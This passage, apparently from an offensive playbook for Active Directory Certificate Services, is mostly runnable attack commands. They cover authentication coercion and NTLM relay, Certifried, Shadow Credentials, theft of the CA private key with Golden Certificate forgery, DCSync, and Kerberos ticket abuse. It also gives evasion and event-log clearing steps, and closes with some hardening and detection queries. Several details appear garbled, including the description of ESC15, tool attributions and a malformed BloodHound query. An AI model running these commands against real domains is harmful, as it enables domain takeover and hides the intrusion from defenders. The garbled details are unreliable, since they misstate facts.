ESC15 (also catalogued as CVE-2024-49019, "Lua EKU abuse", late 2024) applies to templates that include the `1.3.6.1.4.1.311.95.1.1` (lua application) EKU. This EKU is treated permissively by the strong-mapping logic, enabling SAN-based impersonation even on Enforce mode.

### Identify ESC15 Templates

```bash
# Find templates with the lua application EKU
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(pKIExtendedKeyUsage=1.3.6.1.4.1.311.95.1.1)" \
  cn displayName
```

### Exploit ESC15

```bash
# Request a cert with lua EKU and arbitrary SAN
certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'LuaEKUTemplate' \
  -san 'administrator@corp.local'
```

```bash
# Auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.1
```

---

## 18. PetitPotam (CVE-2021-36942) Coercion

### Background

PetitPotam is an unauthenticated LSARPC coercion via `MS-EFSRPC` (`EfsRpcOpenFileRaw`). It forces a target machine (typically a DC) to authenticate to an attacker-controlled IP. Patches in August 2021 (CVE-2021-36942) block anonymous coercion, but authenticated coercion still works in most environments.

### Install PetitPotam

```bash
git clone https://github.com/topotam/PetitPotam.git
cd PetitPotam
python3 -m pip install -r requirements.txt
```

### Anonymous Coercion (Pre-Patch Targets)

```bash
# Trigger DC authentication to attacker
python3 PetitPotam.py -u '' -p '' -d corp.local 10.10.0.100 10.10.0.1
```

### Authenticated Coercion (Post-Patch)

```bash
# Works against patched targets with any valid domain credentials
python3 PetitPotam.py -u 'svc_ldap' -p 'Password123!' -d corp.local \
  10.10.0.100 10.10.0.1
```

### Targeted -- Coerce Specific Machine

```bash
# Force SQL01 to authenticate to attacker
python3 PetitPotam.py -u 'svc_ldap' -p 'Password123!' -d corp.local \
  10.10.0.100 10.10.0.50  # attacker relay SQL01
```

### Coerce via Different Pipe (Post-Mitigation)

After Microsoft blocked MS-EFSRPC, attackers pivoted to other RPC pipes. The original PetitPotam supports several.

```bash
# Try the LSARPC pipe variant
python3 PetitPotam.py -pipe LSARPC -u 'svc_ldap' -p 'Password123!' \
  -d corp.local 10.10.0.100 10.10.0.1
```

### Detection Footprint

PetitPotam coercion leaves a distinct footprint:

- Event ID 4624 (anonymous logon type 3) from the DC to the attacker
- Event ID 5140 (SMB share access) or 5145 (Spike on EFSRPC)
- Outbound network connection from DC to attacker on TCP/445

---

## 19. Coercer -- Multi-Method Coercion

### Background

Coercer (p0dalirius) automates the discovery and exploitation of every known Windows authentication coercion primitive. It sweeps MS-EFSRPC, MS-RPRN, MS-DFSNM, MS-EVEN, and others.

### Install

```bash
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
python3 -m pip install -r requirements.txt
```

### Full Coercion Scan

```bash
# Scan all known coercion methods against a target
python3 Coercer.py coerce -u 'svc_ldap' -p 'Password123!' -d corp.local \
  -t 10.10.0.1 -l 10.10.0.100
```

### Single Method (e.g., PrinterBug)

```bash
# Trigger via MS-RPRN (PrinterBug)
python3 Coercer.py coerce -u 'svc_ldap' -p 'Password123!' -d corp.local \
  -t 10.10.0.1 -l 10.10.0.100 -m RPRN
```

### Discover Available Methods

```bash
# Scan without triggering -- just enumerate
python3 Coercer.py scan -u 'svc_ldap' -p 'Password123!' -d corp.local \
  -t 10.10.0.1
```

---

## 20. Certifried (CVE-2022-26923)

### Background

Certifried (CVE-2022-26923, May 2022, Yair Mizrahi @ Amplify Security) abuses a mismatch between the `dNSHostName` and `sAMAccountName` of a machine account. The CA, when issuing a machine certificate, uses the machine's `dNSHostName` attribute as the certificate's DNS name. If an attacker controls a machine account whose `dNSHostName` collides with a DC's `dNSHostName`, the CA issues a certificate that authenticates as the DC.

### Conditions

1. Attacker controls a machine account (any domain user can add up to 10 by default via `MAQ` -- Machine Account Quota).
2. The attacker can change the machine's `dNSHostName` (default ACL allows this).
3. The CA issues machine certificates based on `dNSHostName` (default behavior for the `Machine` / `DomainController` templates).
4. The CA is not patched (post-May 2022 patches restrict `dNSHostName` collision detection).

### Step 1 -- Create a Machine Account

```bash
# Create a machine account via Impacket
impacket-addcomputer corp.local/svc_ldap:Password123! \
  -computer-name 'EVIL$' -computer-pass 'EvilPass123!'
```

```bash
# Or via ldap-add/ldd
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 \
  add_computer 'EVIL$' 'EvilPass123!'
```

### Step 2 -- Patch dNSHostName to Collide with DC

```bash
# Set dNSHostName to match a DC (the SPN collision is the key)
# Use PowerView or ldeep
ldeep ldap -u 'EVIL$' -p 'EvilPass123!' -d corp.local -s ldap://10.10.0.1 \
  set_attr 'CN=EVIL,CN=Computers,DC=corp,DC=local' dnsHostName 'dc01.corp.local'
```

```bash
# Certipy has a dedicated certifried action
certipy account update -u 'corp\\EVIL$' -p 'EvilPass123!' -dc-ip 10.10.0.1 \
  -dns 'dc01.corp.local'
```

### Step 3 -- Request a Machine Certificate

```bash
# Request a cert -- CA will issue as DC01
certipy req -u 'corp\\EVIL$' -p 'EvilPass123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'Machine'
```

### Step 4 -- Authenticate as DC

```bash
# PKINIT with the forged cert
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.1
```

```bash
# DCSync via the DC cert
KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass dc01.corp.local
```

### Post-Mitigation

Microsoft's May 2022 patch adds the `dNSHostName` collision check at the CA. Exploitation requires either an unpatched CA or a `dNSHostName` that does not collide but is still accepted (observed in some Trust configurations). Check patch level before committing to Certifried as the primary escalation path.

---

## 21. Shadow Credentials (msDS-KeyCredentialLink)

### Background

Shadow Credentials (Elad Shamir, September 2021) abuses the `msDS-KeyCredentialLink` attribute on any AD object. When set with a valid `KeyCredential` blob (containing an attacker-controlled public key), the DC enables PKINIT authentication for that principal using the attacker's private key. The technique requires `GenericWrite` / `WriteAccountRestrictions` / equivalent on the target.

### Conditions

1. The attacker has `GenericWrite`, `WriteDACL`, or equivalent write permission on the target object (user, computer, or service account).
2. The DC is at least Windows Server 2016 (PKINIT for user accounts requires KDC running 2016+).
3. The target's `msDS-KeyCredentialLink` is not already saturated (max 31 entries).

### pywhisker -- the Kali Standard

```bash
# Install pywhisker
python3 -m pip install --upgrade pywhisker
```

```bash
# Add a KeyCredentialLink to a target
pywhisker.py -d corp.local -u 'svc_ldap' -p 'Password123!' \
  --target 'DC01$' --action 'add'
```

```bash
# Target a user account (requires write on the user)
pywhisker.py -d corp.local -u 'svc_ldap' -p 'Password123!' \
  --target 'Administrator' --action 'add'
```

```bash
# List existing KeyCredentialLinks
pywhisker.py -d corp.local -u 'svc_ldap' -p 'Password123!' \
  --target 'DC01$' --action 'list'
```

```bash
# Remove a KeyCredentialLink by device ID
pywhisker.py -d corp.local -u 'svc_ldap' -p 'Password123!' \
  --target 'DC01$' --action 'remove' --device-id '<GUID>'
```

```bash
# Use the resulting PFX for PKINIT
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.1
```

### Whisker -- Windows Equivalent

```cmd
:: Add a KeyCredentialLink
Whisker.exe add /target:DC01$ /domain:corp.local /dc:dc01.corp.local

:: List
Whisker.exe list /target:DC01$

:: Remove
Whisker.exe remove /target:DC01$ /deviceid:<GUID>
```

### BloodHound -- Find GenericWrite Targets

```cypher
// Find all objects where svc_ldap has GenericWrite
MATCH (u:User {name:'CORP\\SVC_LDAP'}), (t)
WHERE (u)-[:GenericWrite]->(t)
RETURN t.name, t.objectid
```

---

## 22. Golden Certificate Forgery

### Background

A Golden Certificate is the PKI equivalent of a Golden Ticket. Once an attacker has the CA's private key (typically recovered from `certsrv.edb`, the CA's `*.pfx` export, or DPAPI-protected machine store), they can forge certificates offline for any principal in the forest. These forgeries are indistinguishable from legitimately issued certificates from the CA's signature perspective -- but they do NOT appear in the CA database (a forensic indicator).

### Step 1 -- Recover the CA Private Key

```bash
# After compromising the CA server, backup the CA cert + key
certutil -backupkey -p 'BackupPass!' C:\CA-Backup\
# Copy the resulting .pfx to the attacker's machine
```

```bash
# Or extract from certsrv.edb (requires CA server access)
esentutl /y /vss "C:\Windows\System32\CertLog\*.edb" /d C:\CA.edb
```

### Step 2 -- Forge a Certificate with certipy forge

```bash
# Forge a cert authenticating as administrator
certipy forge -ca-pfx ca.pfx -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'
```

```bash
# Forge with a specific serial number (to evade CA database correlation)
certipy forge -ca-pfx ca.pfx -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local' \
  -serial 0xdeadbeef
```

### Step 3 -- Authenticate with the Forged Cert

```bash
# PKINIT with the forged cert
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.0.1
```

### Forensic Indicator

A Golden Certificate will pass PKINIT (the CA signature is valid) but will NOT have a corresponding row in the CA database. Defenders can detect this by joining PKINIT-presented serial numbers against CA database records.

```powershell
# Defensive query -- list issued certs from CA database
certutil -view -restrict "Disposition=20" -out "RequestID,RequesterName,SerialNumber"
```

---

## 23. PKINIT -- Cert to TGT Authentication

### Background

PKINIT (RFC 4556) is the Kerberos extension that uses X.509 certificates for AS-REQ pre-authentication. The KDC validates the certificate against the NTAuthStore and issues a TGT bound to the certificate's subject.

### Certipy auth -- Standard PKINIT

```bash
# Standard PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.1
```

```bash
# With explicit username (useful when PFX lacks metadata)
certipy auth -pfx administrator.pfx -u administrator -dc-ip 10.10.0.1 -d corp.local
```

```bash
# Get the resulting ccache path
ls -la administrator.ccache
```

### Use the TGT with Impacket

```bash
# WMI execution with the PKINIT TGT
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass dc01.corp.local
```

```bash
# SMB access
export KRB5CCNAME=administrator.ccache
smbclient -k -L //dc01.corp.local
```

```bash
# Secrets dump (DCSync via PKINIT TGT)
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass dc01.corp.local
```

### PKINIT via Pure Python (pkinittools)

```bash
# For environments without Certipy, the older gettgtpkinit.py
python3 gettgtpkinit.py corp.local/administrator -cert-pfx admin.pfx \
  -pfx-pass '' administrator.ccache
```

### Schannel -- Direct LDAP/S Auth

```bash
# Use the cert directly for Schannel auth to LDAPS
certipy auth -pfx administrator.pfx -ldap -dc-ip 10.10.0.1
```

---

## 24. Rubeus PKINIT on Windows Footholds

### Background

Rubeus (GhostPack / HarmJ0y) is the standard Kerberos attack toolkit on Windows. It supports PKINIT via the `asktgt` command with a `/certificate:` parameter.

### Request a TGT with a PFX

```cmd
:: Ask for a TGT using a PFX
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:"" /domain:corp.local /dc:dc01.corp.local /ptt
```

```cmd
:: Use a PEM cert + key instead
Rubeus.exe asktgt /user:administrator /certificate:admin.crt /password:"" /domain:corp.local /dc:dc01.corp.local /nowrap
```

### Use the TGT

```cmd
:: Pass the ticket
Rubeus.exe ptt /ticket:base64_ticket

:: Dump current tickets
Rubeus.exe klist

:: Perform S4U (constrained delegation abuse)
Rubeus.exe s4u /ticket:administrator.kirbi /impersonateuser:Administrator /msdsspan:host/dc01.corp.local /ptt
```

### tgtdeleg -- Pivot Through PKINIT

```cmd
:: Extract a usable TGT from a PKINIT-authenticated session
Rubeus.exe tgtdeleg
```

---

## 25. Kekeo PKINIT and Golden Cert

### Background

Kekeo (GentilKiwi, sibling of mimikatz) implements PKINIT and full Kerberos attack primitives. It's the canonical choice when working with `.kirbi` (Binary Kerberos) format rather than `.ccache`.

### Request a TGT with a PFX

```cmd
:: Kekeo PKINIT
kekeo.exe "tgt::ask /pfx:admin.pfx /user:administrator /domain:corp.local"
```

### Forge and Pass Tickets

```cmd
:: Pass the ticket
kekeo.exe "kerberos::ptt administrator.kirbi"

:: Generate a Golden Ticket from krbtgt hash
kekeo.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXX /krbtgt:ntlmhash /ptt"
```

---

## 26. X.509 Parsing with OpenSSL and certutil

### Decode a PFX

```bash
# Decode PFX to PEM cert + key
openssl pkcs12 -in admin.pfx -nocerts -out admin.key -nodes -passin pass:''
openssl pkcs12 -in admin.pfx -nokeys -out admin.crt -passin pass:''
```

### Inspect the Certificate

```bash
# Full text dump
openssl x509 -in admin.crt -text -noout
```

```bash
# Focus on Subject Alternative Name
openssl x509 -in admin.crt -text -noout | grep -A3 'Subject Alternative Name'
```

```bash
# Focus on Extended Key Usage
openssl x509 -in admin.crt -text -noout | grep -A5 'Extended Key Usage'
```

```bash
# Focus on Authority Key Identifier (for chain analysis)
openssl x509 -in admin.crt -text -noout | grep -A2 'Authority Key'
```

### Verify the Chain Against the NTAuthStore

```bash
# Build a chain file with the Root CA + Sub CA + issued cert
cat root_ca.crt sub_ca.crt admin.crt > chain.pem
openssl verify -CAfile root_ca.crt -untrusted sub_ca.crt admin.crt
```

### ASN.1 Parsing

```bash
# Dump the ASN.1 structure
openssl asn1parse -in admin.crt -inform PEM
```

```bash
# Parse the DER form
openssl asn1parse -in admin.der -inform DER
```

### Native Windows -- certutil

```cmd
:: Dump cert info
certutil -dump admin.pfx

:: Verify a cert against the local store
certutil -verify admin.crt

:: View cert chain
certutil -viewstore CA
```

---

## 27. Certify (GhostPack) Enumeration and Abuse

### Background

Certify (HarmJ0y) is the original C# AD CS attack toolkit. It runs in-memory via Cobalt Strike's `execute-assembly` and is the standard for engagements with a Windows foothold.

### Enumeration

```cmd
:: Full vulnerable template scan
Certify.exe find /vulnerable

:: Vulnerable templates the current user can enroll against
Certify.exe find /vulnerable /currentuser

:: Show all enabled templates
Certify.exe find /enabled

:: Output as JSON for parsing
Certify.exe find /vulnerable /json
```

### Request a Certificate

```cmd
:: Standard request
Certify.exe request /ca:CA01.corp.local\CORP-CA01-CA /template:VulnTemplate

:: ESC1 -- with SAN
Certify.exe request /ca:CA01.corp.local\CORP-CA01-CA \
  /template:VulnTemplate /altname:administrator
```

### Convert PEM to PFX

```cmd
:: Convert the PEM cert + key to a PFX (Rubeus needs PFX)
Certify.exe cert2pfx admin.pem admin.key admin.pfx
```

---

## 28. PSPKIAudit / PSPKI Module

### Background

PSPKI (PowerShell PKI module) is the canonical PowerShell PKI module. PSPKIAudit wraps it for AD CS audit automation.

### Install

```powershell
# Install PSPKI
Install-Module -Name PSPKI -Scope CurrentUser -Force
Import-Module PSPKI
```

### Enumerate Templates

```powershell
# List all templates
Get-CATemplate

# List with detailed ACL info
Get-CATemplate | ForEach-Object {
  $acl = Get-ACL -Path "AD:\CN=$($_.Name),CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$((Get-ADRootDSE).configurationNamingContext)"
  [PSCustomObject]@{
    Template = $_.Name
    ACLs = ($acl.Access | Where-Object { $_.ActiveDirectoryRights -match 'Write|GenericAll' } | Select-Object IdentityReference, ActiveDirectoryRights)
  }
}
```

### Audit CA Configuration

```powershell
# Get CA info
Get-CertificationAuthority | Format-List Name, ComputerName, Type, ConfigString

# Audit CA flags (relevant for ESC6)
Get-CertificationAuthority | ForEach-Object {
  [PSCustomObject]@{
    CA = $_.Name
    EditFlags = (Get-CertificationAuthority -Name $_.Name | Get-CAPolicy).EditFlags
  }
}
```

---

## 29. ADCSPwn -- End-to-End ESC8 Automation

### Background

ADCSPwn (bsbedo) automates the entire ESC8 chain: coercion, relay, cert request, and PKINIT in one tool. Useful for quick demonstrations during an engagement.

### Install

```bash
git clone https://github.com/bats3c/ADCSPwn.git
cd ADCSPwn
python3 -m pip install -r requirements.txt
```

### Run the Full Chain

```bash
# Single command: coerce DC -> relay to CA -> get cert
python3 adcs_pwn.py --adcs ca01.corp.local --port 80 \
  --target dc01.corp.local --username svc_ldap --password Password123! \
  --domain corp.local
```

### Output

The tool prints the resulting base64 PFX. Pipe it to certipy auth.

```bash
# Save the PFX and PKINIT
python3 adcs_pwn.py ... | tee pfx.b64
echo "$(tail -1 pfx.b64)" | base64 -d > dc01.pfx
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.1
```

---

## 30. NDES / SCEP Abuse

### Background

Network Device Enrollment Service (NDES) is the Microsoft SCEP implementation for issuing certs to network devices (routers, switches). It exposes an HTTP endpoint at `/certsrv/mscep/` and uses a one-time enrollment password.

### Discovery

```bash
# Probe the NDES endpoint
curl -sk http://ca01.corp.local/certsrv/mscep/mscep.dll | head -20
```

### Get the NDES Admin Password

NDES uses a "challenge password" generated every 60 minutes by the `MSCEP-ADMIN` user. The admin password is stored in the IIS app pool's variable.

```bash
# If you have access to the NDES server, dump the admin password
winrs -r:CA01 -u:CORP\\administrator -p:Password123! \
  "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /xml"
```

### Abuse -- Request a Device Cert

```bash
# Use certipy's NDES module
certipy ndes -u 'corp\\ndes_admin' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -target ca01.corp.local
```

---

## 31. Detection Evasion and Anti-Forensics

### Understanding the Detection Surface

AD CS attacks leave traces in three primary locations:

1. **CA database** (`certsrv.edb`) -- every issued certificate is logged
2. **Windows Security event log** -- Event IDs 4886 (request), 4887 (issued), 4768 (PKINIT TGT), 4662 (template/CA modify)
3. **IIS logs on Web Enrollment server** -- for ESC8 / ESC11 attacks

### Time-Box Engagements

```bash
# Time the attack to coincide with normal business hours (when certs are normally issued)
# Avoid midnight operations -- those stand out in the audit log
```

### Restore Modified Templates

```bash
# Always restore ESC4-modified templates from the saved configuration
certipy template -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -template 'WritableTemplate' \
  -configuration 'WritableTemplate.json.old'
```

### Avoid Obvious Detection Patterns

```bash
# Don't enumerate all templates in a single pass -- break into smaller queries
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -template 'SpecificTemplate'  # Instead of full -vulnerable scan
```

### Use a Low-Privileged Account for Enumeration

```bash
# Avoid using Domain Admin creds for certipy find -- use a low-priv service account
# The enumeration is no more powerful with DA creds, but the audit log tells defenders you panicked
```

### Clear Event Logs (Post-Exploitation Only -- With Permission)

```cmd
:: ONLY with explicit engagement permission
wevtutil cl Security
wevtutil cl Application
```

> NOTE: Clearing event logs is itself a high-signal alert. Microsoft Defender for Identity raises a "Log cleared" alert. Use this only when the SOW explicitly permits destructive OPSEC.

### Remove KeyCredentialLinks

```bash
# After Shadow Credentials persistence, clean up
pywhisker.py -d corp.local -u 'svc_ldap' -p 'Password123!' \
  --target 'DC01$' --action 'remove' --device-id '<your_key_id>'
```

---

## 32. Defensive Verification and Hardening

### Identify All ESC1 Templates

```powershell
# PowerShell one-liner to find ESC1 templates
Get-ADObject -Filter {
  objectClass -eq 'pKICertificateTemplate' -and
  msPKICertificateNameFlag -band 1
} -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$((Get-ADRootDSE).configurationNamingContext)" |
  Select-Object Name
```

### Check CA EditFlags (ESC6)

```cmd
:: Check if EDITF_ATTRIBUTESUBJECTALTSSUBJECT2 is set
certutil -getreg policy\\EditFlags
:: Look for EDITF_ATTRIBUTESUBJECTALTSSUBJECT2 in the output
```

### Disable ESC6 Flag

```cmd
:: Remove the dangerous flag
certutil -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTSSUBJECT2
net stop certsvc && net start certsvc
```

### Enforce Strong Certificate Mapping

```cmd
:: Set Full Enforce mode (KB5014754)
reg add HKLM\SYSTEM\CurrentControlSet\Services\Kerberos\Parameters /v StrongCertificateBindingEnforcement /t REG_DWORD /d 2 /f
```

### Disable Web Enrollment (ESC8 / ESC11 Mitigation)

```cmd
:: Via Server Manager -- remove the Web Enrollment role service
:: Or via PowerShell
Uninstall-WindowsFeature -Name ADCS-Web-Enrollment
```

### Enable EPA on Web Enrollment (If You Must Keep It)

```cmd
:: Enable Extended Protection for Authentication on the certsrv IIS app
appcmd set config "Default Web Site/certsrv" -section:system.webServer/security/authentication/windowsAuthentication /extendedProtection.tokenChecking:"Require" /commit:apphost
```

### Audit Template ACLs Periodically

```powershell
# Run a weekly audit and alert on any template ACL change
$baseline = Get-Content baseline_templates.json | ConvertFrom-Json
$current = Get-CATemplate | ForEach-Object { ... }  # Build current state
Compare-Object $baseline $current
```

### HSM-Back the CA Private Key

The single most impactful hardening step is to deploy the CA private key on an HSM. Even if an attacker compromises the CA server, they cannot extract the key from the HSM -- neutralising Golden Certificate attacks.

### Recommended Detection Queries

```kusto
// Microsoft Sentinel / KQL -- ESC8 pattern
SecurityEvent
| where EventID == 4768
| where PreAuthenticationType == 16  // PKINIT
| where AccountType == "Machine"
| summarize count() by Account, IpAddress, bin(TimeGenerated, 1h)
| where count() > 5  // Threshold for "burst"
```

```kusto
// Shadow Credentials detection
SecurityEvent
| where EventID == 4662
| where Properties has "5cb47ed8-8b67-4947-b91e-5f6e0bbe2c1a"  // KeyCredentialLink attribute
| project TimeGenerated, Account, Computer
```

```kusto
// ESC1 / ESC6 -- SAN mismatch detection
SecurityEvent
| where EventID == 4887
| extend Requester = Account
| extend Template = extract(@"template:\s*([^,]+)", 1, Message)
| extend Subject = extract(@"subject:\s*([^,]+)", 1, Message)
| where Requester != Subject  // SAN mismatch
| project TimeGenerated, Requester, Template, Subject
```

### Hardening Checklist

- [ ] Apply August 2021 patches (PetitPotam CVE-2021-36942)
- [ ] Apply May 2022 patches (Certifried CVE-2022-26923)
- [ ] Disable AD CS Web Enrollment if not used
- [ ] Enable EPA / CBT on certsrv if Web Enrollment is required
- [ ] Remove `EDITF_ATTRIBUTESUBJECTALTSSUBJECT2` from all CAs
- [ ] Remove `ENROLLEE_SUPPLIES_SUBJECT` from all Client Auth / PKINIT KDC templates
- [ ] Audit template ACLs -- remove `GenericAll`, `WriteDacl`, `WriteOwner` from non-admin principals
- [ ] Restrict `ManageCA` and `ManageCertificates` to Domain Admins / Enterprise Admins
- [ ] Set `StrongCertificateBindingEnforcement = 2` (Full Enforce)
- [ ] Deploy CA private key on HSM
- [ ] Implement three-tier CA hierarchy (Offline Root -> Policy CA -> Issuing CA)
- [ ] Configure Event 4886 / 4887 forwarding to SIEM
- [ ] Configure Microsoft Defender for Identity rules for KeyCredentialLink writes

### Final Notes

- All commands in this file assume an **authorized engagement** with a signed scope of work.
- Test every payload in a lab before running against a production environment.
- Many payloads generate noisy logs -- coordinate with the defender's blue team when doing purple-team validation.
- Track the patched status of every CVE referenced (PetitPotam, Certifried, ESC15/CVE-2024-49019) -- patched targets require authenticated or alternative paths.

### References

- SpecterOps, "Certified Pre-Owned", June 2021 -- https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
- Microsoft, "KB5005413: Machine Account protection" -- https://support.microsoft.com/en-us/topic/kb5005413
- Microsoft, "KB5014754: Strong certificate mapping" -- https://support.microsoft.com/en-us/topic/kb5014754
- Elad Shamir, "Shadow Credentials" -- https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8221a53766ac
- Yair Mizrahi, "Certifried" -- https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4
- Oliver Lyak, Certipy documentation -- https://github.com/ly4k/Certipy

---

## Appendix A -- PKI Internals Reference

### X.509 v3 Certificate Structure

An X.509 v3 certificate is an ASN.1 DER-encoded structure with the following top-level fields:

```
Certificate
  +-- Version (v3)
  +-- Serial Number
  +-- Signature Algorithm (sha256RSA, etc.)
  +-- Issuer (CA's DN)
  +-- Validity
  |     +-- Not Before
  |     +-- Not After
  +-- Subject (DN of the holder)
  +-- Subject Public Key Info
  |     +-- Algorithm (RSA, ECDSA)
  |     +-- Public Key
  +-- Extensions
        +-- Subject Alternative Name (SAN) -- 2.5.29.17
        +-- Extended Key Usage (EKU) -- 2.5.29.37
        +-- Basic Constraints -- 2.5.29.19
        +-- Key Usage -- 2.5.29.15
        +-- Authority Key Identifier -- 2.5.29.35
        +-- Subject Key Identifier -- 2.5.29.14
        +-- Certificate Policy -- 2.5.29.32
        +-- Authority Information Access (AIA) -- 1.3.6.1.5.5.7.1.1
        +-- CRL Distribution Point (CDP) -- 2.5.29.31
        +-- Microsoft Security Extension (szOID_NT_PRINCIPAL_NAME) -- 1.3.6.1.4.1.311.20.2.3
```

### ASN.1 DER Encoding Quick Reference

```bash
# Inspect the raw DER structure of a certificate
openssl asn1parse -in admin.crt -inform PEM

# Show the structure with offsets
openssl asn1parse -in admin.crt -inform PEM -i

# Extract just the extensions
openssl x509 -in admin.crt -text -noout | grep -A100 'X509v3 extensions'
```

### EKU OID Reference (for AD CS)

| EKU | OID | Use Case |
|-----|-----|----------|
| Server Authentication | 1.3.6.1.5.5.7.3.1 | TLS server certs |
| Client Authentication | 1.3.6.1.5.5.7.3.2 | TLS client certs (PKINIT-eligible) |
| Code Signing | 1.3.6.1.5.5.7.3.3 | Executable signing |
| Email Protection | 1.3.6.1.5.5.7.3.4 | S/MIME |
| Time Stamping | 1.3.6.1.5.5.7.3.8 | RFC 3161 |
| OCSP Signing | 1.3.6.1.5.5.7.3.9 | OCSP responder |
| IPSEC | 1.3.6.1.5.5.7.3.6 / 1.3.6.1.5.5.8.2.2 | IPSEC tunnel |
| Smart Card Logon | 1.3.6.1.4.1.311.20.2.2 | Smart card auth |
| PKINIT Client Auth | 1.3.6.1.5.2.3.4 | RFC 4556 client |
| PKINIT KDC | 1.3.6.1.5.2.3.5 | RFC 4556 KDC (DC cert) |
| Document Encryption | 1.3.6.1.4.1.311.80.1 | Exchange / AIP |
| AnyPurpose | 2.5.29.37.0 | No restriction |
| SubCA | 2.5.29.37.0 | Subordinate CA |
| Enrollment Agent | 1.3.6.1.4.1.311.20.2.1 | EA cert |
| Key Recovery Agent | 1.3.6.1.4.1.311.21.6 | KRA |
| EFS | 1.3.6.1.4.1.311.10.3.4 | Encrypting File System |
| EFS Recovery | 1.3.6.1.4.1.311.10.3.4.1 | EFS recovery |
| Certificate Request Agent | 1.3.6.1.4.1.311.20.2.1 | On-behalf-of |
| lua application (ESC15) | 1.3.6.1.4.1.311.95.1.1 | Lua app EKU |

### Microsoft PKINIT (RFC 4556) Authentication Flow

1. Client generates an X.509 cert via enrollment (or has one issued).
2. Client generates a PA-PK-AS-REQ pre-auth payload containing the cert and a signature over a nonce.
3. Client sends AS-REQ to the KDC with PA-PK-AS-REQ.
4. KDC validates the cert chain against NTAuthStore (and the CA's validity).
5. KDC validates the signature against the cert's public key.
6. KDC maps the cert to an AD principal via:
   - The `szOID_NT_PRINCIPAL_NAME` extension (SAN as UPN)
   - The Subject's DN matching `sAMAccountName` (subject-based)
   - Strong mapping (post-KB5005413): the cert's SID must match the requester's SID.
7. KDC issues a TGT bound to the cert subject.

### CA Types and Roles

| CA Type | Description |
|---------|-------------|
| Enterprise Root CA | Integrated with AD, self-signed, published to NTAuthStore |
| Enterprise Sub CA | Integrated with AD, signed by parent CA |
| Standalone Root CA | Independent of AD, self-signed |
| Standalone Sub CA | Independent of AD, signed by parent CA |

A typical enterprise deployment uses a three-tier hierarchy:

```
Offline Root CA (powered off except for certificate signing)
  +-- Policy Issuing CA (online, defines policy OIDs)
        +-- Issuing CA 1 (issues user / machine certs)
        +-- Issuing CA 2 (issues code signing certs)
        +-- Issuing CA 3 (issues NDES / device certs)
```

### CEP/CES Endpoints

- **CEP (Certificate Enrollment Policy)** -- Web service exposing the enrollment policy. Endpoint: `/ADPolicyProvider_CEP_Kerberos/service.svc/CEP`
- **CES (Certificate Enrollment Service)** -- Web service exposing the enrollment interface. Endpoint: `/ADPolicyProvider_CES_Kerberos/service.svc/CES`

These are the modern (Windows 2008+) replacements for the legacy `certsrv` Web Enrollment. They are typically exposed over HTTPS with Kerberos authentication, which makes them resistant to NTLM relay.

---

## Appendix B -- Cross-Forest and Trust Abuse

### Forest Trust PKI Considerations

In a cross-forest trust, the trusting forest's DC must validate certificates issued by the trusted forest's CA. This is done via the `NTAuthStore` object in the trusting forest's Configuration partition.

```bash
# Query the NTAuthStore for cross-forest CAs
ldapsearch -x -H ldap://dc01.trusting.local -D "TRUSTING\\svc_ldap" -w 'Password123!' \
  -b "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=trusting,DC=local" \
  "(objectclass=certificationAuthority)" cn cACertificate
```

### Cross-Forest ESC8

If a trusting forest's DC has SMB signing disabled (rare) and a trusted forest's CA has Web Enrollment enabled, an attacker can coerce the trusting DC to authenticate to the trusted CA via NTLM relay.

```bash
# Coerce a trusting-forest DC
python3 PetitPotam.py -u 'trusted\\svc_ldap' -p 'Password123!' -d trusted.local \
  10.10.0.100 10.10.99.1   # trusting DC IP

# Relay to the trusted forest's CA
ntlmrelayx.py -t http://ca01.trusted.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template 'DomainController' -d trusted.local
```

---

## Appendix C -- BloodHound Integration

### Certipy BloodHound Output

Certipy can output attack paths in BloodHound-compatible format for graphing and path analysis.

```bash
# Generate BloodHound-compatible JSON
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -bloodhound -output bloodhound_adcs/

# Import the resulting JSON into BloodHound
# BloodHound will show new edges:
# - Enroll (user -> template)
# - AutoEnroll (user -> template)
# - ManageCA (user -> CA)
# - ESC1, ESC2, ESC3, ... (template -> domain)
```

### Useful BloodHound Queries

```cypher
// Find all paths from any user to Domain Admin via PKI
MATCH p = SHORTEST 10 (u:User)-[:Enroll|GenericAll|GenericWrite|WriteDacl*1..5]->(t:GPO)
WHERE t.name CONTAINS 'Template'
RETURN p
```

